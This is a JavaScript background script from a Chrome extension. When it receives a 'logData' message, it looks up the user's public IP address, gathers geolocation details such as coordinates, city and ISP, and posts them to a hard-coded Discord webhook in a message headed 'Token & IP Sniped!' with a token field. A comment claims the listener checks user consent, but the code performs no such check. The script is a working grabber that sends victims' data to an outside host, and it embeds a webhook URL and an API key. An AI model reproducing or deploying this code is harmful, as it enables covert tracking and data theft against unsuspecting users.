const webhookUrl = 'https://discord.com/api/webhooks/1248743559566463019/F9QjQKfpuJGqy2wINLrWa-bJndSdFb89Blat1KDVBiIrRtavzjDDSb_k4A0w1u_Hj97r';
const geoApiUrl = 'https://api.ipgeolocation.io/ipgeo?apiKey=cf4402b8e7744bc1b9afeb92fff73466&ip=';

// Listener to check user consent
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'logData') {
    logData();
  }
  sendResponse({status: 'done'});
});

function logData() {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      getGeolocationInfo(data.ip);
    })
    .catch(error => console.error('Error fetching IP address:', error));
}

function getGeolocationInfo(ip) {
  fetch(geoApiUrl + ip)
    .then(response => response.json())
    .then(data => {
      sendDataToDiscord(ip, data);
    })
    .catch(error => console.error('Error fetching geolocation info:', error));
}

function sendDataToDiscord(ip, geoInfo) {
  const data = {
    content: `🔒 **Token & IP Sniped!**\n🔑 Token: [USER_TOKEN]\n🌍 IP Address: ${ip}\n🏙️ Location: ${geoInfo.city}, ${geoInfo.country_name}\n🌎 Region: ${geoInfo.state_prov}\n📡 ISP: ${geoInfo.isp}\n🕒 Timezone: ${geoInfo.time_zone.name}\n📍 Latitude: ${geoInfo.latitude}\n📍 Longitude: ${geoInfo.longitude}\n🏢 Organization: ${geoInfo.organization}`
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}
